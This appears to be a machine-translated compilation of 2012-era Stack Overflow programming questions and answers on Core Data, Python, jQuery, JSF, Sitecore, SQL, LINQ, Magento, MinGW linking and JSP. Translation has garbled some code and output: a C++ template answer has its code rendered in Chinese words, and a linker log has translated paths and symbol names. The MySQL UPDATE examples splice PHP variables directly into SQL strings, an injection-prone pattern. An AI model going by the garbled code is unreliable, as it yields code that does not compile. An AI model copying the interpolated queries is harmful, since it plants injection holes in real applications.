I solved the exact same problem with deadlocks caused by simultaneous fetching from two threads (BG executed fired fetchRequest, MAIN one performed fetch of NSFRC). The solution is to create a new context for the long running sync operation. It has no parent context, it has concurrency type `NSPrivateQueueConcurrencyType` and it directly linked with a common PSC. After all long running work is done within this context in background, I save it and merge it with rest parallel contexts stack by using `mergeChangesFromContextDidSaveNotification` routine.

A great solution is implemented in Magical Record 3\. See more info here: [https://stackoverflow.com/a/25060126/1885326](https://stackoverflow.com/a/25060126/1885326).

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-10-06T08:58:34.037

> The idea being most of the long hard work and saves can be done on the private MOC

How do you implement that idea? Do you use something like this:

```
- (void)doSomethingWithDocument:(UIManagedDocument *)document
{
    NSManagedObjectContext *parent = document.managedObjectContext.parentContext;
        [parent performBlock:^{
            /* 
               Long and expensive tasks.. 
               execute fetch request on parent context
               download from remote server               
            */
            // save document
        }];
} 
```

I did above and got deadlock too. Then I tried not to touch the backing queue of parent context. Instead, I use plain and simple GCD to do the downloading stuff, and manipulate core data in child context (on main queue). It works fine. In this way parent context seems useless.. But at least it doesn't cause deadlock..

```
- (void)doSomethingWithDocument:(UIManagedDocument *)document
{
    dispatch_queue_t fetchQ = dispatch_queue_create("Flickr fetcher", NULL);
    dispatch_async(fetchQ, ^{
        // download from remote server        
        // perform in the NSMOC's safe thread (main thread)
        [document.managedObjectContext performBlock:^{ 
            // execute fetch request on parent context
            // save document  
        }];
    });
    dispatch_release(fetchQ);
} 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-10-31T16:23:39.680

I just wanted to chime in and agree completely with avoiding nested contexts. I've been working in iOS 7 with nested contexts (main queue child and private queue parent) and NSFetchedResultsControllers and had an impossible to fix deadlock issue. I switched over to using independent MOCs and save notifications and the issue disappeared.

If anyone needs a quick guide for how to change their code over, this page has code that's ready to go (just ignore the nested context recommendation):

[http://www.cocoanetics.com/2012/07/multi-context-coredata/](http://www.cocoanetics.com/2012/07/multi-context-coredata/)

# python - Python2.7 - Sqlite3 - 2 个输入

> ID：11786440
> 
> 赞同：0
> 
> 时间：2012-08-02T22:00:09.997
> 
> 标签：python, sqlite

我正在写一个像这样的小python脚本：

```
#!/usr/bin/env python

from sqlite3 import dbapi2 as sqlite
from sys import argv,exit

db_name = "hashez.db"

def define_db():
    try:
        conn = sqlite.connect(db_name)
    except IOError as e:
        print "problem while creating/connecting the db:",e.args[0]
        exit(1)

    return conn

def write_db(conn,cursor,na,ha):
    conn.execute("CREATE TABLE IF NOT EXISTS user (name TEXT UNIQUE, hash TEXT UNIQUE)")
    query = "INSERT OR REPLACE INTO user VALUES($name,$hash)"
    cursor.execute(query,[na],[ha])
    cursor.close()  
    conn.commit()
    conn.close()
    exit(0)

if __name__ == "__main__":
    if len(argv) == 2:
        na,ha = argv[1]
        #ha = argv[2]
    else:
        print "no argument given - stopping now"
        exit(1)

    conn = define_db()
    cursor = conn.cursor()
    write_db(conn,cursor,na,ha) 
```

当我尝试接受一个输入时我没有问题

`python user.py blah`

但是当我尝试处理多个时，它会进入 else 循环。

我在哪里做错误？请指导我通过...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:09:51.393

您会收到此错误，因为第一个参数实际上是文件名。

一个简单的测试文件显示了它是如何工作的：

```
[~]$ cat test.py
from sys import argv

if __name__ == '__main__':
    print argv
    print len(argv)
[~]$ python test.py one two
['test.py', 'one', 'two']
3
[~]$ python test.py one
['test.py', 'one']
2 
```

您还应该修复您的 SQL/查询

```
query = "INSERT OR REPLACE INTO user VALUES(?,?)"
cursor.execute(query,[na,ha])
conn.commit() 
```

请参阅[sqlite api 文档](http://docs.python.org/library/sqlite3.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:09:02.610

中的第一个元素`sys.argv`是脚本的名称，因此您可能实际上需要以下 if 语句：

```
if len(argv) == 3:
    na = argv[1]
    ha = argv[2] 
```

# javascript - 带有效果的 Jquery 翻转

> ID：11786441
> 
> 赞同：0
> 
> 时间：2012-08-02T22:00:09.850
> 
> 标签：javascript, jquery, jquery-ui, mouseover

我用 jquery 创建了这个翻转，但没有得到动画背景鼠标悬停：

```
<script>
$(function () {

var number_menus=5;

for(i=1;i<=number_menus;i++)
{

if(i%2==0)
{
var p1=1;

$(".web_header_mb_"+i).show(1000).css("background","url(imagenes/botones/head_"+p1+"_up.png)");

$(".web_header_mb_"+i).mouseover(function() {

$(this).css("background-image","url(imagenes/botones/head_"+p1+"_down.png)");

$(this).animate(
{backgroundPosition:"(0 -250px)"}, 
{opacity:3.0},
{height: 'toggle'},
{duration:2000}
);

});

$(".web_header_mb_"+i).mouseout(function() {

$(this).css("background-image","url(imagenes/botones/head_"+p1+"_up.png)");

});

}
else
{
var p2=2;

$(".web_header_mb_"+i).show(1000).css("background","url(imagenes/botones/head_"+p2+"_up.png)");

$(".web_header_mb_"+i).mouseover(function() {

$(this).css("background-image","url(imagenes/botones/head_"+p2+"_down.png)");

});

$(".web_header_mb_"+i).mouseout(function() {

$(this).css("background-image","url(imagenes/botones/head_"+p2+"_up.png)");

});

}

}

});

</script>

<div id="web_header_menu_boton" class="web_header_mb_1" style="display:none;">1</div>
<div id="web_header_menu_boton" class="web_header_mb_2" style="display:none;">2</div>
<div id="web_header_menu_boton" class="web_header_mb_3" style="display:none;">3</div>
<div id="web_header_menu_boton" class="web_header_mb_4" style="display:none;">4</div>
<div id="web_header_menu_boton" class="web_header_mb_5" style="display:none;">5</div> 
```

当我将鼠标悬停时，我尝试将动画背景作为 2 个不同背景之间的过渡，但没有得到

问候 ！！！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T23:38:22.553

这是我认为您要求[http://jsfiddle.net/d6pQx/32/](http://jsfiddle.net/d6pQx/32/)的演示。让我知道这个是否奏效。

# jsf - jsf - 将请求参数传递给操作方法中的bean不起作用

> ID：11786442
> 
> 赞同：1
> 
> 时间：2012-08-02T22:00:14.190
> 
> 标签：jsf, action, param

我有一个 GET 参数`url.xhtml?key=test`，它使用以下方法在我的网站上正确显示：

```
value="#{param.key}" 
```

现在我想将该参数作为参数传递给commandButton 内的bean 的操作方法调用？

但它总是空在豆子里？

```
action="#{bean.action(param.key)}" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:02:51.663

该 EL 表达式是在处理表单提交的请求期间评估的，而不是在显示表单的请求期间。请求参数显然没有保留在后续请求中。

您可以通过将其添加为`<f:param>`命令组件来做到这一点：

```
<f:param name="key" value="#{param.key}" /> 
```

# security - 对 Alias 功能区菜单可见性的 sitecore 权限

> ID：11786447
> 
> 赞同：2
> 
> 时间：2012-08-02T22:00:36.340
> 
> 标签：security, permissions, sitecore, sitecore6

我正在尝试查找允许在“演示”选项卡功能区中查看别名功能的权限安全性。

对于有问题的用户，我浏览了核心数据库，在 Access 查看器下，我正在查看 Applications/Content Editor 下的所有项目都具有读取权限，特别是项目`/sitecore/content/Applications/Content Editor/Ribbons/Strips/Presentation/Page Urls`以及`/sitecore/content/Applications/Content Editor/Ribbons/Chunks/Page Urls`读取权限

但是，当以该用户身份登录时，没有演示选项卡。

我已经尝试重置缓存，但仍然没有任何变化。我正在使用 sitecore 6.5.0

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-09T21:06:27.563

我想你快到了，但你仍然需要为用户提供对 /sitecore/system/Aliases 项目的足够访问权限。

1.  创建一个新角色（或使用现有角色），例如 sitecore\Sitecore Client Aliases。使用此角色添加以下权限。

2.  切换到核心数据库并允许 /sitecore/content/Applications/Content Editor/Ribbons/Chunks/Page Urls 项目及其后代的读取权限

3.  切换到主数据库并使用“配置”选项卡中的“取消保护项目”复选框取消保护 /sitecore/system/Aliases 项目。

4.  允许 /sitecore/system/Aliases 项目的读取、写入、创建权限以及其后代的读取、写入、创建、删除权限。

5.  保护 /sitecore/system/Aliases 项目回来。

6.  将用户添加到 sitecore\Sitecore 客户端别名角色。

在这里找到：[http ://wiki.evident.nl/Sitecore%20alias%20role.ashx](http://wiki.evident.nl/Sitecore%20alias%20role.ashx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-06T09:54:59.190

启用演示选项卡的最简单方法是使用 sitecore 标准角色。我不完全确定，但我认为它是`sitecore\Sitecore Client Designing`。

据我所知，您必须使用这些标准角色才能访问某些块。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T07:42:39.313

尝试为没有看到别名选项卡的用户使用访问查看器。您可以手动切换到核心数据库，然后单击具有指定用户/角色的不同选项卡，以查看导致此行为的原因。大多数时候，您会发现某些角色/限制被设置为更高级别的项目 dat 拒绝读取权限。

# sql - Oracle 在创建表中命名约束以将日期设置为默认日期

> ID：11786448
> 
> 赞同：0
> 
> 时间：2012-08-02T22:00:39.163
> 
> 标签：sql, oracle

我想在我的`CREATE TABLE`语句中添加一个命名约束，这将导致我的列默认为系统日期。我知道如何定义主键约束：

```
constraint cust_ID_PK PRIMARY KEY (Cust_ID) 
```

如何定义`Hire_Date`默认为系统日期的约束？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:05:53.947

您可以为列设置默认值。但这不是一个约束，所以你不能命名它。

```
CREATE TABLE customer (
  cust_id   NUMBER,
  hire_date DATE DEFAULT sysdate,
  CONSTRAINT cust_id_pk PRIMARY KEY( cust_id )
) 
```

默认值不是一种约束，因此您不能使用定义约束的语法来定义默认值。默认值不是数据库中的对象类型，因此它不能有名称。默认值是列的属性——它只能与列内联声明。

# jquery - 如何在 jQuery 中创建列表元素？

> ID：11786452
> 
> 赞同：1
> 
> 时间：2012-08-02T22:00:47.007
> 
> 标签：jquery, html

我尝试了不同的解决方案，但没有取得多大成功。

我可以将 a 添加`<li>`到我的列表中，但 DOM 无法将其识别为列表元素，因此我以后无法使用 jQuery 对其进行操作。

这是我尝试过的最后一个代码，但我收到错误消息：

> 类型错误：`$('</li>').class`不是函数

代码：

```
 var data = '<div> some stuff</div>';
 var index = "index-" + brand_name[0].toLowerCase();

 $("</li>")
   .class(index)
   .text(data)
   .insertAfter($(".brand_list .main-"+index))
   .css('display','list-element'); 
```

我也尝试过`<li></li>`，`<li>`但我得到了同样的错误。

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T22:01:55.480

你应该使用`.addClass()`而不是`.class()`. 更多信息在这里：[http ://api.jquery.com/addClass/](http://api.jquery.com/addClass/)

# php - 在不同队列上同时创建消息

> ID：11786458
> 
> 赞同：0
> 
> 时间：2012-08-02T22:01:12.360
> 
> 标签：php, rabbitmq

我有一个从队列中提取消息的脚本，它执行其他进程工作所需的预处理。

现在，必须传递这些消息，所以我需要确认这些消息，如果其中一个侦听消息的服务出现故障，那么它应该在重新联机时收到它错过的消息。

几个问题：

1/每次预处理运行时添加每个后处理服务的队列是否有意义？（所以我可能会在每个进程之后同时添加到 8 个不同的队列 - 这将是大量消息（每天数十万条消息）。

2/ 将消息添加到队列中有多快？添加到 8-10 个队列会减慢我的软件速度吗？

3/我可以使用主题交换来通过扇出来做到这一点吗？我唯一担心的是，如果我的一项服务出现故障，他们会错过消息。

4/有经验的人有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:50:56.523

一些想法：

如果您的后处理器每个人都在做不同的“工作”，那么让他们使用队列是有意义的。如果您只有一堆后处理器都在执行相同的任务，那么您只需要有一个队列，它们都可以从中消费消息。

将消息添加到队列中很快，将队列添加到 RabbitMQ 中很快，将队列绑定到交换器中也很快。会减慢系统速度的因素是消息的大小和您可能收到的数量，以及实际需要完成的处理量。

另一个考虑是与消息的持久性有关，如果您的消息在 RabbitMQ 重新启​​动后仍然存在，也就是说，它们有多重要？如果不丢失它们至关重要（从您的问题的声音来看是这样），那么您将需要确保它们被保留。如果您查看 RabbitMQ 文档，您会发现这样做的成本很高。

这取决于您的系统实际在做什么...... Topcis 很好，Fanouts 很好，但是您的系统做什么取决于哪个适用。

我*强烈*推荐阅读 RabbitMQ in Action，它是一个极好的资源，而且物有所值。

# c++ - 使用 CRTP 技术来确保唯一的模板参数

> ID：11786459
> 
> 赞同：1
> 
> 时间：2012-08-02T22:01:17.927
> 
> 标签：c++, template-meta-programming

来自`boost::units`：

```
struct my_base_dimension1 : units::base_dimension<my_base_dimension1, 1> { };  // ok
struct my_base_dimension2 : units::base_dimension<my_base_dimension2, 2> { };  // ok
struct my_base_dimension3 : units::base_dimension<my_base_dimension3, 2> { };  // error 
```

我试图了解代码如何确保模板参数是唯一的。我不明白`check_base_dimension`最终如何返回一个非零值，这会触发`ordinal_has_already_been_defined<true>`. 我认为这与`boost_units_is_registered()`在 中重新定义有关`base_dimension`，但我不知道该`friend`版本是如何被调用的。有任何想法吗？

有问题的文件是`base_dimension.hpp`和`prevent_redefinition.hpp`。

```
template<class Derived, long N,
         class = typename detail::ordinal_has_already_been_defined<
             check_base_dimension<Derived, N>::value
             >::type
         >
class base_dimension : public ordinal<N>
{
public:
    typedef base_dimension this_type;
    typedef list<dim<Derived,static_rational<1> >, dimensionless_type> dimension_type;
    typedef Derived type;

private:                                                                                                                           
    friend Derived*
    check_double_register(const units::base_dimension_ordinal<N>&)
        { return(0); }

    friend detail::yes
    boost_units_is_registered(const units::base_dimension_ordinal<N>&)
        { detail::yes result; return(result); }

    friend detail::yes
    boost_units_is_registered(const units::base_dimension_pair<Derived, N>&)
        { detail::yes result; return(result); }
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T23:40:03.363

啊哈，我相信我拥有它。

答案在本节：

```
        /// 注册这个序数
        /// 仅限内部
        朋友详细信息::是的
        boost_units_is_registered(常量单位::base_dimension_ordinal&)
        {返回（详细信息：：是（））；}

        /// 但要确保我们可以识别当前的实例化！
        /// 仅限内部
        朋友详细信息::是的
        boost_units_is_registered(常量单位::base_dimension_pair&)
        {返回（详细信息：：是（））；}
```

`friend`声明表明存在与这些参数匹配的函数，并返回`detail::yes`.

当为给定模板实例化`enum`in时，它会查找采用这两种类型的函数。如果这些模板参数的先前实例不存在，它会找到返回 a的函数，但如果*确实*存在，它会找到与返回.`check_base_dimension``boost_units_is_registered``prevent_redefinition.hpp``detail::no`*`friend``detail::yes`*

 *重要的是要注意这都是在编译时，而不是运行时。编译器使用[依赖于参数的查找](http://en.wikipedia.org/wiki/Argument-dependent_name_lookup)来查找匹配的函数。该`sizeof`函数的结果仅取决于函数返回的内容——它根本不需要运行或调用，它只需要一个给出返回值大小的声明。因此，当编译器找到`friend`函数时，它就可以确定`sizeof`返回值——函数实际上不需要有定义。当然，如果您尝试使用它（例如，让它实际运行），您会收到链接器错误，因为它已声明但从未定义。

结果，`sizeof()`在编译时确定 a 的大小与 a`detail::yes`的大小不同`detail::no`。表达式的结果是因此`false`，因此`check_base_dimension::value`是`false`，并且的实例化`ordinal_has_already_been_defined`没有得到一个名为的成员变量`type`。

因此，编译器会抛出一个错误，指出

```
detail::ordinal_has_already_been_defined<check_base_dimension<Derived, N>::value> does not have a member variable 'type' 
```

或类似的。最终，目标达到了：你不能用两个具有相同模板参数值的类实例来编译代码。嘘！*

# javascript - 更新后 JQuery Mobile 动态列表视图丢失样式（数据插入）

> ID：11786465
> 
> 赞同：5
> 
> 时间：2012-08-02T22:01:44.023
> 
> 标签：javascript, jquery-mobile, cordova

我正在创建一个移动应用程序（Phonegap/Cordova 1.5.0、JQM 1.1.0）并在 iOS 5.1 上进行测试。我有一个用户“拥有”或想要拥有的项目列表。在整个应用程序中，用户可以通过添加和删除项目来编辑他们的列表。每当添加或删除项目时，列表都会更新，并且显示正常，所有 JQuery CSS 都完好无损，***除了***角不再是圆角（我在想是因为 data-inset 设置为“false”）。

这是我的列表标题的 html：

```
<div data-role="page" id="profile">
        <div data-role="header" data-position="fixed">
            <...>
        </div><!-- /header -->
        <div data-role="content" data-theme="a">
            <...>

            <ul id="user-wants-list" data-role="listview" data-inset="true" data-theme="d" data-dividertheme="d" >
            </ul> <!--/Wants list-->
            </br>

            <ul id="user-haves-list" data-role="listview" data-inset="true" data-theme="d" data-dividertheme="d" >
            </ul>  <!--/Has list-->
            </br></br>
        </div> <!--/content-->
</div> <!--/Profile--> 
```

这是我删除旧列表并动态添加新列表的Javascript（参数“haves”是一个对象数组）：

```
function displayHaves(haves){

var parent = document.getElementById('user-haves-list');
removeChildrenFromNode(parent);
parent.setAttribute('data-inset','true');
$(parent).listview("refresh");

var listdiv = document.createElement('li');
listdiv.setAttribute('id','user-haves-list-divider');
listdiv.setAttribute('data-role','list-divider');
listdiv.innerHTML = "I Have (" + haves.length + ")";
parent.appendChild(listdiv);

//create dynamic list
for(i=0;i<haves.length;i++){
    var sellListing = haves[i].listing;
    var userInfo = haves[i].user;
    var itemData = haves[i].item;

    //create each list item
    var listItem = document.createElement('li');
    listItem.setAttribute('id','user-haves-list-item-'+i);
    parent.appendChild(listItem);
    var link = document.createElement('a');
    link.setAttribute('id','user-haves-link-' + i);
    new FastButton(link, function(listing) {
                   return function() { displaySellListingPage(listing); }
                   }(sellListing));
    listItem.appendChild(link);

    var link = document.getElementById('user-haves-link-' + i);
    var pic = document.createElement('img');
    pic.setAttribute('src',itemData.pictureURL);
    pic.setAttribute('width','80px');
    pic.setAttribute('height','100px');
    pic.setAttribute('style','padding-left: 10px');
    link.appendChild(pic);
    var list = document.getElementById('user-haves-list');
    $(list).listview("refresh");
} 
```

}

我的功能 removeChildrenFromNode(parent) 如下：

```
function removeChildrenFromNode(node){
    while (node.hasChildNodes()){
         node.removeChild(node.firstChild);
    }
} 
```

所以我的问题是，为什么列表视图会丢失 data-inset 属性？

或者，同样有效：除了“data-inset='true'”之外，还有其他方法可以/应该实现圆角吗？

以下是我尝试过的事情：

*   在列表视图和页面上使用 .trigger("create")
*   每次使用 $("#page-ID").append(...) 添加具有显式样式的列表视图
*   我在 StackOverflow 上阅读了另一篇文章，其中说 JQM 在您创建项目时会创建一些内部元素（这篇文章与动态按钮大小不正确有关），并且您可以使用一些类（如 .ui-btn）可以访问（当我从节点中删除子节点时可能会丢失样式？），但我无法在这个方向上取得任何进展。

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T23:55:15.987

我想出了我的问题的答案，但还没有找到解决方案。

`$(list).listview('refresh')`在某些元素被放到页面上之前就被调用了，所以它基本上没有被调用（或者另一种思考方式是，每个被附加的列表项都发生*在*刷新调用之后，所以它覆盖了一些视觉风格）。

我知道问题与javascript中的异步加载有关。本质上，`.listview('refresh)`在较早的代码之前执行，它创建元素但执行时间更长。我理解设计背后的原因，但是在这种情况下有什么办法可以解决这个问题吗？

我在想一些我可以设置的条件，比如：

```
var doneLoading = false;
//Then when finished set doneLoading to 'true'
if(doneLoading) $(list).listview('refresh'); 
```

但是如果首先调用刷新，我认为它`doneLoading`只会`false`在列表实际完成加载后评估然后不执行。

有什么我可以使用的 onComplete 回调，或者让它同步发生的方法吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T17:42:40.493

更新 HTML 后尝试调用 listview(refresh)。

# php - 正在检查 $_SERVER['REQUEST_METHOD'] 以确定请求类型的不良做法吗？

> ID：11786468
> 
> 赞同：0
> 
> 时间：2012-08-02T22:01:59.440
> 
> 标签：php, codeigniter, rest

我正在制作一个系统，该系统需要能够接受来自 get 和 post 的输入，并相应地进行处理。我想避免使用 $_REQUEST，因为我们的一些服务器没有配置为使用它，我不想对其进行微观管理。我想知道的是，做这样的事情是否是不好的做法：

```
 switch ($_SERVER['REQUEST_METHOD']) {
        case 'POST':
            $this->_process($_POST); 
            break;
        case 'GET': 
            $this->_process($_GET);
            break;
    } 
```

*暂时忽略post数据预处理的不足

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:17:47.620

检查请求的方法正是`$_SERVER['REQUEST_METHOD']`目的。所以没有问题。

这个值实际上是[CGI 规范](http://www.faqs.org/rfcs/rfc3875.html)的一部分，因此应该由任何体面的网络服务器提供：

> REQUEST_METHOD 元变量必须设置为脚本用于处理请求的方法，如 4.3 节所述。

# mysql - 使用 INNER JOIN 命令使用 OFFSET 命令更新多个变量

> ID：11786470
> 
> 赞同：1
> 
> 时间：2012-08-02T22:02:03.263
> 
> 标签：mysql

我需要编辑这段代码：

```
UPDATE favorites SET category='$newcat',subcategory='$newsubcat',
sitename='$newwebsitename',
url='$newwebsiteurl' WHERE email='$email' ORDER BY favoritesid ASC LIMIT 1 
```

添加： 'OFFSET 1' 到最后，但由于 UPDATE 不允许该`OFFSET`命令，我需要使用 an`INNER JOIN`添加该部分。但是我只知道在删除单个变量时如何执行此操作，例如：

```
DELETE a FROM favorites a
INNER JOIN
(
  SELECT favoritesid
  FROM favorites
  WHERE email = '$email'
  ORDER BY favoritesid
  LIMIT 1 OFFSET x

 ) b ON a.favoritesid = b.favoritesid 
```

但是当更新多个变量时，我什至不知道从哪里开始。谁能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:05:05.483

也许是这样的：

```
UPDATE favorites A INNER JOIN
(
    SELECT favoritesid FROM favorites WHERE email='$email'
    ORDER BY favoritesid LIMIT x
) B USING (favoritesid)
SET
    A.category='$newcat',
    A.subcategory='$newsubcat',
    A.sitename='$newwebsitename',
    A.url='$newwebsiteurl'
; 
```

这是另一种选择：

```
UPDATE favorites A
SET
    A.category='$newcat',
    A.subcategory='$newsubcat',
    A.sitename='$newwebsitename',
    A.url='$newwebsiteurl'
WHERE A.favoritesid = 
(
    SELECT MAX(favoritesid) FROM favorites WHERE email='$email'
    ORDER BY favoritesid LIMIT x
); 
```

这些示例假定偏移量为 0。如果您有偏移量，请尝试以下操作：

```
UPDATE favorites A INNER JOIN
(
    SELECT favoritesid FROM favorites WHERE email='$email'
    ORDER BY favoritesid LIMIT x OFFSET $myoffset
) B USING (favoritesid)
SET
    A.category='$newcat',
    A.subcategory='$newsubcat',
    A.sitename='$newwebsitename',
    A.url='$newwebsiteurl'
; 
```

# c# - 使用 Take in SQL LINQ 查询：语法差异导致挂起和 SQLException？

> ID：11786473
> 
> 赞同：1
> 
> 时间：2012-08-02T22:02:30.567
> 
> 标签：c#, sql, linq

我是 C# 和 LINQ 的新手，但后者非常酷。除了我无法弄清楚这里发生了什么：

我有以下代码，它按预期运行；它排序并选择前 100 条记录：

```
IEnumerable<workerLog> query =
    (from record in _gzClasses.workerLogs                
    orderby record.workerID, record.timeStamp ascending                
    select record).Take(100);

foreach(var record in query)
{
    Console.WriteLine(record.timeInSession.ToString());
} 
```

但是当我执行以下操作时，会打印相同的行，但是程序会挂起一点，并抛出 SQLException 说服务器超时。

```
IEnumerable<workerLog> query =
    from record in _gzClasses.workerLogs                
    orderby record.workerID, record.timeStamp ascending                
    select record;

foreach(var record in query.Take(100))
{
    Console.WriteLine(record.timeInSession.ToString());
} 
```

这里有什么不同？它与执行 LINQ 查询的方式有关吗？来自 Java 世界，这没有任何意义。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:21:08.483

这是错误：

```
IEnumerable<workerLog> query = 
```

通过强制它`IEnumerable<WorkerLog>`，您破坏了“组合”，这意味着 SQL 服务器认为您已经请求了**所有**数据，并且**在接收方**您将选择只关心前 100 行。如果您`IQueryable<WorkerLog>`改为使用（或仅使用`var`），则它可以将 Take(100) “组合”到 SQL 中并发出：

```
select top 100 ... 
```

请注意，在第一个示例中，您只能在它组成`IEnumerable<WorkerLog>` **之后**强制它，这样就可以了.... ish。

基本上，`IQueryable<T>`是可组合的 API，可以从多个操作中生成有趣的 TSQL。`IEnumerable<T>`是 LINQ-to-Objects，它在 c# 中而不是在 SQL 中进行过滤 / 等。

# magento - magento 控制器的动态路由器名称

> ID：11786475
> 
> 赞同：3
> 
> 时间：2012-08-02T22:02:33.717
> 
> 标签：magento

我将如何创建一个自定义模块，该模块具有一个动态操作名称的控制器，因为它可以由用户在管理区域中随意配置并在自定义模块中自动更新？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2018-10-19T19:45:13.813

您可以在控制器中覆盖此方法：

```
public function getActionMethodName($action)
{
    return 'indexAction';
}

public function indexAction()
{
    //action name
    var_dump($this->getRequest()->getActionName());
 } 
```

然后总是会转到索引操作，您可以在其中使用原始操作名称作为参数。

然后：

[http://mysite/mymodule/mycontroller/im-dracula-blablabla](http://mysite/mymodule/mycontroller/im-dracula-blablabla)

将工作！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T02:10:39.270

`__call`我认为您可以通过在控制器上使用魔术 php 方法来解决此问题。

我假设您将操作名称存储在名为“mymodule/controller/action”的 Magento 配置中，因此您可以使用以下方法获取值：

```
Mage::getStoreConfig('mymodule/controller/action'); 
```

然后你有控制器，例如 Mymodule/controllers/TestController.php

然后像这样在该控制器中添加方法：

```
public function __call($method, $arg) {
     if ($method == Mage::getStoreConfig('mymodule/controller/action')) {
           //Do whatever you want
     }
} 
```

这将使您的控制器//在您使用配置中指定的操作访问它时执行您想要的任何操作。基本思路是这样的。希望这可以帮助。

# c++ - 为什么 g++ 在 ws2_32 中找不到 getnameinfo？

> ID：11786479
> 
> 赞同：0
> 
> 时间：2012-08-02T22:02:48.307
> 
> 标签：c++, windows, g++, mingw, winsock

我不明白为什么 g++`getnameinfo`在 ws2_32 中找不到，nm 显示它在那里。这是输出：

```
$ I:/Programs/MinGW/msys/1.0/bin/sh.exe ../libtool --tag=CXX --mode=link g++
 -g -O2 -no-undefined -version-info 16:0:0 -o libetpan.la -rpath /i/Programs/M
inGW/lib dummy.lo versioninfo.lo data-types/libdata-types.la low-level/liblow-l
evel.la driver/libdriver.la main/libmain.la engine/libengine.la windows/libarch
.la -L/i/Programs/MinGW/lib -lws2_32 -liconv
libtool：链接：rm -fr .libs/libetpan.dll.a
libtool：链接：g++ -shared -nostdlib i:/programs/mingw/bin/../lib/gcc/mingw32/4。
7.0/../../../dllcrt2.oi:/programs/mingw/bin/../lib/gcc/mingw32/4.7.0/crtbegin.o
  .libs/dummy.o .libs/versioninfo.o -Wl,--whole-archive data-types/.libs/libdat
a-types.a 低级/.libs/liblow-level.a 驱动程序/.libs/libdriver.a main/.libs/lib
main.a 引擎/.libs/libengine.a windows/.libs/libarch.a -Wl,--no-whole-archive
-lws2_32 -lws2_32 -lws2_32 -lws2_32 -lws2_32 -lws2_32 -L/i/Programs/MinGW/lib -l
ws2_32 /mingw/lib/libiconv.dll.a -Li:/programs/mingw/bin/../lib/gcc/mingw32/4.7。
0 -Li:/programs/mingw/bin/../lib/gcc -Li:/programs/mingw/bin/../lib/gcc/mingw32/
4.7.0/../../../../mingw32/lib -Li:/programs/mingw/bin/../lib/gcc/mingw32/4.7.0/。
./../.. -lstdc++ -lmingw32 -lgcc_s -lgcc -lmoldname -lmingwex -lmsvcrt -ladvapi3
2 -lshell32 -luser32 -lws2_32 -lkernel32 -lmingw32 -lgcc_s -lgcc -lmoldname -lmi
ngwex -lmsvcrt i:/programs/mingw/bin/../lib/gcc/mingw32/4.7.0/crtend.o -O2 -p
线程 -o .libs/libetpan-16.dll -Wl,--enable-auto-image-base -Xlinker --out-impl
ib -Xlinker .libs/libetpan.dll.a
创建库文件：.libs/libetpan.dll.a
警告：通过链接到 _closesocket@4 来解析 _closesocket
使用 --enable-stdcall-fixup 禁用这些警告
使用 --disable-stdcall-fixup 禁用这些修复
低级/.libs/liblow-level.a(mailsmtp.o)：在函数“get_hostname”中：
c:\libetpan-00c7589\src\low-level\smtp/mailsmtp.c:266: 未定义引用`_
获取名称信息'
collect2.exe：错误：ld 返回 1 退出状态

$ nm /i/Programs/MinGW/lib/libws2_32.a | grep 获取名称信息
00000000 我 __imp__getnameinfo@28
00000000 T _getnameinfo@28

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:44:46.620

我需要`#define _WIN32_WINNT 0x0501`

# html - 将 HTML 表单数据数组发送到 JSP/Servlet

> ID：11786486
> 
> 赞同：11
> 
> 时间：2012-08-02T22:03:13.763
> 
> 标签：html, arrays, forms, jsp, servlets

我来自 PHP 世界，任何名称以方括号结尾的表单数据都会自动被解释为数组。例如：

```
<input type="text" name="car[0]" />
<input type="text" name="car[1]" />
<input type="text" name="car[3]" /> 
```

将在 PHP 端被捕获为名称“car”的数组，其中包含 3 个字符串。

现在，有没有办法在提交到 JSP/Servlet 后端时复制该行为？有什么图书馆可以为你做吗？

编辑：

为了进一步扩展这个问题：

在 PHP 中，

```
<input type="text" name="car[0][name]" />
<input type="text" name="car[0][make]" />
<input type="text" name="car[1][name]" /> 
```

会给我一个嵌套数组。如何在 JSP 中重现它？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-02T22:09:38.180

`[]`为了让 PHP 将请求参数识别为数组，请求参数名称中的符号是必要的技巧。这在 JSP/Servlet 等其他 Web 语言中是**不必要的。**摆脱那些括号

```
<input type="text" name="car" />
<input type="text" name="car" />
<input type="text" name="car" /> 
```

这样，它们将在[`HttpServletRequest#getParameterValues()`](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletRequest.html#getParameterValues%28java.lang.String%29).

```
String[] cars = request.getParameterValues("car");
// ... 
```

### 也可以看看：

*   [使用 HTTP Get 发送数组](https://stackoverflow.com/questions/3061273/send-an-array-with-an-http-get/)

# objective-c - Execute SSH Command on remote Linux Machine using Native Mac App. (Obj-C)

> ID：11786492
> 
> 赞同：2
> 
> 时间：2012-08-02T22:03:30.940
> 
> 标签：objective-c, xcode, linux, ssh

I have a Mac Native app written with Xcode. I want to execute some SSH command using that application on remote servers and get the result back to user.

Is there any library/Framework exist for that? Is that possible?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T23:29:38.440

